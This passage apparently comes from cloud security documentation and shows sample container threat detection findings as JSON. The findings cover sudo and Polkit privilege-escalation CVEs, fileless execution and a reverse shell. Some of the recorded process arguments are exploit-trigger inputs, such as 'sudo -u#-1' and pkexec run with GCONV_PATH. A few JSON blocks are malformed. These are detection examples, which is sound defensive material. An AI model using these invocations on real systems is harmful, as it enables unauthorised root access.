            "parent_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
            "parent_display_name": "PROJECT_ID",
            "type": "google.container.Cluster",
            "folders": []
          },
          "sourceProperties": {
            "Container_Image_Id": "CONTAINER_IMAGE_ID",
            "Pod_Namespace": "default",
            "Container_Name": "CONTAINER_NAME",
            "Process_Binary_Fullpath": "/bin/echo",
            "description": "A malicious URL is observed in the container workload.",
            "VM_Instance_Name": "VM_INSTANCE_NAME",
            "Pid": 1,
            "Process_Arguments": [
              "/bin/echo",
              "https://testsafebrowsing.appspot.com/s/malware.html"
            ],
            "Container_Image_Uri": "CONTAINER_IMAGE_URI",
            "Parent_Pid": 0,
            "Process_Creation_Timestamp": {
              "seconds": 1663191345,
              "nanos": 7717272
            },
            "Environment_Variables": [
              "PATH=/opt/python3.7/bin:/opt/python3.6/bin:/opt/python3.5/bin:/opt/python3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
              "HOSTNAME=CONTAINER_NAME",
              "DEBIAN_FRONTEND=noninteractive",
              "LANG=C.UTF-8",
              "PYTHONUNBUFFERED=1",
              "PORT=8080",
              "KUBERNETES_PORT_443_TCP_ADDR=IP_ADDRESS",
              "KUBERNETES_SERVICE_HOST=IP_ADDRESS",
              "KUBERNETES_SERVICE_PORT=443",
              "KUBERNETES_SERVICE_PORT_HTTPS=443",
              "KUBERNETES_PORT=tcp://IP_ADDRESS:443",
              "KUBERNETES_PORT_443_TCP=tcp://IP_ADDRESS:443",
              "KUBERNETES_PORT_443_TCP_PROTO=tcp",
              "KUBERNETES_PORT_443_TCP_PORT=443",
              "HOME=/root"
            ],
            "Container_Creation_Timestamp": {
              "seconds": 1663191345,
              "nanos": 0
            },
            "Pod_Name": "CONTAINER_NAME"
          }
        }
      

#### Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Privilege Escalation: Abuse of Sudo For Privilege Escalation (CVE-2019-14287)",
        "chokepoint": {},
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2025-07-22T00:07:48Z"
          }
        ],
        "createTime": "2025-07-22T00:07:54.853Z",
        "database": {},
        "dataProtectionKeyGovernance": {},
        "eventTime": "2025-07-22T00:07:54.627Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/770715367326",
              "timestamp": "2025-07-22T00:07:48.052030557Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "EXPLOITATION_FOR_PRIVILEGE_ESCALATION"
          ],
          "additionalTactics": [
            "DEFENSE_EVASION",
            "PRIVILEGE_ESCALATION"
          ],
          "additionalTechniques": [
            "ABUSE_ELEVATION_CONTROL_MECHANISM"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
       "processes": [
          {
            "binary": {
              "path": "\"/tmp/sudo\"",
              "size": "142312",
              "sha256": "1bea8094b78a3910345d80af3d182390fda07ae5788352651eb7773505dc39af",
              "hashedSize": "142312",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"/tmp/sudo\"",
              "\"-u#-1\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-abuse-sudo-2025-07-21-17-20-36-utc\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"TERM\"",
                "val": "\"xterm\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"1\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"_\"",
                "val": "\"/tmp/sudo\""
              }
            ],
            "pid": "10",
            "parentPid": "1",
            "userId": "0"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_abuse_sudo_for_privilege_escalation"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0004/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/1bea8094b78a3910345d80af3d182390fda07ae5788352651eb7773505dc39af/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
        

#### Privilege Escalation: Fileless Execution in /dev/shm
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Privilege Escalation: Fileless Execution in /dev/shm",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "PROCESS_INJECTION"
          ]
          "additionalTactics": [
            "DEFENSE_EVASION"
          ],
          "additionalTechniques": [
            "COMMAND_AND_SCRIPTING_INTERPRETER",
            "UNIX_SHELL",
            "HIDE_ARTIFACTS"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"/dev/shm/echo\"",
              "size": "39096",
              "sha256": "a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84",
              "hashedSize": "39096",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"eho\"",
              "\"Hello World\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"HOSTNAME\"",
                "val": "\"CONTAINER_NAME\""
              },
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "HIGH",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_fileless_execution_detection"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0004/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/a51595201def5bde3c47d68c8e8dda31f4e424293f2a5eefb00e47f2db0c2d84/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Privilege Escalation: Polkit Local Privilege Escalation Vulnerability (CVE-2021-4034)",
        "chokepoint": {},
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2025-07-22T00:07:48Z"
          }
        ],
        "createTime": "2025-07-22T00:07:54.853Z",
        "database": {},
        "dataProtectionKeyGovernance": {},
        "eventTime": "2025-07-22T00:07:54.627Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/770715367326",
              "timestamp": "2025-07-22T00:07:48.052030557Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "EXPLOITATION_FOR_PRIVILEGE_ESCALATION"
          ],
          "additionalTactics": [
            "RESOURCE_DEVELOPMENT"
          ],
          "additionalTechniques": [
            "OBTAIN_CAPABILITIES",
            "OBTAIN_CAPABILITIES_VULNERABILITIES"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"pkexec\"",
              "size": "142312",
              "sha256": "1bea8094b78a3910345d80af3d182390fda07ae5788352651eb7773505dc39af",
              "hashedSize": "142312",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"pkexec\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"GCONV_PATH\"",
                "val": "\"junk\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-polkit-2025-07-21-23-06-20-utc\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/home/ubuntu\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"TERM\"",
                "val": "\"xterm\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"1\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"_\"",
                "val": "\"/tmp/pkexec\""
              }
            ],
            "pid": "9",
            "parentPid": "1",
            "userId": "0"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_polkit_local_privilege_escalation_vulnerability"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0004/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/1bea8094b78a3910345d80af3d182390fda07ae5788352651eb7773505dc39af/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
        

#### Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Privilege Escalation: Sudo Potential Privilege Escalation (CVE-2021-3156)",
        "chokepoint": {},
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2025-07-22T00:07:48Z"
          }
        ],
        "createTime": "2025-07-22T00:07:54.853Z",
        "database": {},
        "dataProtectionKeyGovernance": {},
        "eventTime": "2025-07-22T00:07:54.627Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/770715367326",
              "timestamp": "2025-07-22T00:07:48.052030557Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "EXPLOITATION_FOR_PRIVILEGE_ESCALATION"
          ],
          "additionalTactics": [
            "DEFENSE_EVASION",
            "PRIVILEGE_ESCALATION",
            "RESOURCE_DEVELOPMENT"
          ],
          "additionalTechniques": [
            "ABUSE_ELEVATION_CONTROL_MECHANISM",
            "ABUSE_ELEVATION_CONTROL_MECHANISM_SUDO_AND_SUDO_CACHING",
            "OBTAIN_CAPABILITIES",
            "OBTAIN_CAPABILITIES_VULNERABILITIES"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "\"sudo\"",
              "size": "142312",
              "sha256": "1bea8094b78a3910345d80af3d182390fda07ae5788352651eb7773505dc39af",
              "hashedSize": "142312",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "\"sudo\"",
              "\"-s\"",
              "\"123\\\\\""
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-sudo-potential-2025-07-21-23-57-06-utc\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/home/ubuntu\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"TERM\"",
                "val": "\"xterm\""
              },
              {
                "name": "\"SHLVL\"",
                "val": "\"1\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"_\"",
                "val": "\"/tmp/sudo\""
              }
            ],
            "pid": "9",
            "parentPid": "1",
            "userId": "0"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_sudo_potential_privilege_escalation"
        },
        "detectionPriority": "CRITICAL",
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/tactics/TA0004/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/1bea8094b78a3910345d80af3d182390fda07ae5788352651eb7773505dc39af/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      }
    }
        

#### Reverse Shell
    
    
    {
      "finding": {
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "state": "ACTIVE",
        "category": "Reverse Shell",
        "sourceProperties": {
          "Reverse_Shell_Stdin_Redirection_Src_Ip": "SOURCE_IP_ADDRESS",
          "Environment_Variables": ["HOSTNAME\u003dreverse-shell",
          "KUBERNETES_PORT\u003dtcp://IP_ADDRESS:PORT",
          "KUBERNETES_PORT_443_TCP_PORT\u003d443", "PYTHONUNBUFFERED\u003d1",
          "KUBERNETES_SERVICE_PORT\u003d443",
          "KUBERNETES_SERVICE_HOST\u003dIP_ADDRESS",
          "PATH\u003d/opt/python3.7/bin:/opt/python3.6/bin:/opt/python3.5/bin:/opt/p
          ython3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
          , "PWD\u003d/home/vmagent/app", "LANG\u003dC.UTF-8", "SHLVL\u003d1",
          "HOME\u003d/root", "KUBERNETES_PORT_443_TCP_PROTO\u003dtcp",
          "KUBERNETES_SERVICE_PORT_HTTPS\u003d443",
          "DEBIAN_FRONTEND\u003dnoninteractive", "PORT\u003d8080",
